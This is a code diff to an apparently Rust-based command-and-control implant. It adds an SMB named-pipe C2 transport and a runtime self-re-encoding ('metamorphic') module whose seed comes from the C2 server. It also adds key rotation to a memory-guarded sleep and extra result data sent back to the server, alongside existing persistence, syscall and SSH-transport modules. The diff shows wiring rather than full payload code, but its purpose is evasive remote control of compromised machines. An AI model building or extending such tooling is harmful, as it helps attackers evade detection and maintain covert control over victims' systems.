@@ -12,6 +12,9 @@ pub mod outbound;
 #[cfg(feature = "ssh-transport")]
 pub mod c2_ssh;
 
+#[cfg(feature = "smb-pipe-transport")]
+pub mod c2_smb;
+
 #[cfg(feature = "persistence")]
 pub mod persistence;
 
@@ -25,6 +28,10 @@ pub mod remote_assist;
 pub mod hci_logging;
 
 pub mod syscalls;
+
+// Self-re-encoding ("Metamorphic Lite"): re-encode .text at runtime.
+#[cfg(feature = "self-reencode")]
+pub mod self_reencode;
 
 // Memory-guard: active implementation when feature is on, zero-cost stubs when off.
 #[cfg(feature = "memory-guard")]
@@ -155,6 +162,7 @@ impl Agent {
                     if let Err(e) = crate::memory_guard::guarded_sleep(
                         std::time::Duration::from_secs(RECHECK_INTERVAL_SECS),
                         None,
+                        0, // no key rotation during dormant sleep
                     )
                     .await
                     {
@@ -325,6 +333,28 @@ impl Agent {
         info!("Agent started, waiting for commands...");
         let mut tasks = tokio::task::JoinSet::new();
 
+        // Spawn the periodic self-re-encoding background task.  The seed is
+        // initially zero (no seed from C2 yet) and will be updated when the
+        // server sends `SetReencodeSeed`.  The task is a no-op until a seed
+        // is set.
+        #[cfg(feature = "self-reencode")]
+        {
+            let interval = {
+                let cfg = self.config.read().await;
+                cfg.reencode_interval_secs
+            };
+            let shutdown = crate::handlers::SHUTDOWN_NOTIFY.clone();
+            tasks.spawn(async move {
+                let _ = crate::self_reencode::spawn_periodic_reencode(
+                    crate::self_reencode::current_seed(),
+                    std::time::Duration::from_secs(interval),
+                    shutdown,
+                )
+                .await;
+            });
+            info!("self-reencode background task spawned (interval={interval}s)");
+        }
+
         loop {
             let msg_fut = async {
                 let mut transport = self.transport.lock().await;
@@ -356,7 +386,7 @@ impl Agent {
                     let transport = self.transport.clone();
                     tasks.spawn(async move {
                         let config = Arc::new(Mutex::new(config_handle.read().await.clone()));
-                        let (response, audit_event) = handlers::handle_command(
+                        let (response, result_data, audit_event) = handlers::handle_command(
                             crypto,
                             config.clone(),
                             command,
@@ -383,6 +413,7 @@ impl Agent {
                             .send(Message::TaskResponse {
                                 task_id,
                                 result: response,
+                                result_data,
                             })
                             .await
                         {
